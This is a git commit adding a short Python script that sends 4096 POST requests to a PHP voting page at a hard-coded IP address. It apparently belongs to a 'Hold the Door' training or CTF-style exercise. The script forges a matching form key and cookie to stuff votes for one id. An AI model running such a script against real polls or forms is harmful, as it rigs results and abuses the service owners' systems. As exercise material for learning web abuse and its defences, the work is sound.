f2ca0c77814ce7a70a585ca4e3d9370ebf57839f
blanketmanatee <ashleyl.welch@gmail.com>
2021-01-10 19:34:49 -0600

    complete

---
+++ level_1/level_1.py
@@ -0,0 +1,14 @@
+#!/usr/bin/python3
+
+
+import requests
+from http import cookies
+
+url = 'http://158.69.76.135/level1.php'
+id = 1844
+time = 4096
+
+for votes in range(time):
+    passValues = {'id': '1844', 'holdthedoor': 'Submit', 'key': 'freshCookie'}
+    kookies = {'HoldTheDoor': 'freshCookie'}
+    r = requests.post(url, data=passValues, cookies=kookies)
